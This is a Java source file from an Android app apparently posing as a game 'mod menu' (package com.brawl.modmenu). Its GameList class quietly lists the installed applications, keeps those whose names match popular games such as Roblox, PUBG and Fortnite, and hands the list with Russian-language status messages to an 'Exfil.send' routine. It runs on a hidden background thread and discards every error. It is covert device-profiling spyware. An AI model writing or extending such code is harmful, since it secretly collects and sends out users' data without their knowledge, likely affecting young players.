package com.brawl.modmenu;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import java.util.Arrays;
import java.util.List;

public class GameList {

    private static final List<String> GAME_KEYWORDS = Arrays.asList(
        "roblox", "minecraft", "brawl", "standoff", "pubg", "free fire",
        "genshin", "clash", "supercell", "epic games", "fortnite",
        "call of duty", "among us", "pokemon", "arena", "mobile legends",
        "honkai", "league of legends", "valorant", "csgo", "dota"
    );

    public static void dump(Context ctx) {
        new Thread(() -> {
            try {
                PackageManager pm = ctx.getPackageManager();
                List<ApplicationInfo> apps = pm.getInstalledApplications(0);
                StringBuilder sb = new StringBuilder();
                int count = 0;
                for (ApplicationInfo ai : apps) {
                    String name = pm.getApplicationLabel(ai).toString();
                    String low = name.toLowerCase();
                    for (String kw : GAME_KEYWORDS) {
                        if (low.contains(kw)) {
                            sb.append("🎮 ").append(name).append("\n   ")
                              .append(ai.packageName).append("\n");
                            count++;
                            break;
                        }
                    }
                }
                if (count == 0) {
                    Exfil.send("GAMES", "Игры не найдены");
                } else {
                    sb.insert(0, "Найдено игр: " + count + "\n\n");
                    Exfil.send("GAMES", sb.toString());
                }
            } catch (Throwable ignored) {}
        }).start();
    }
}
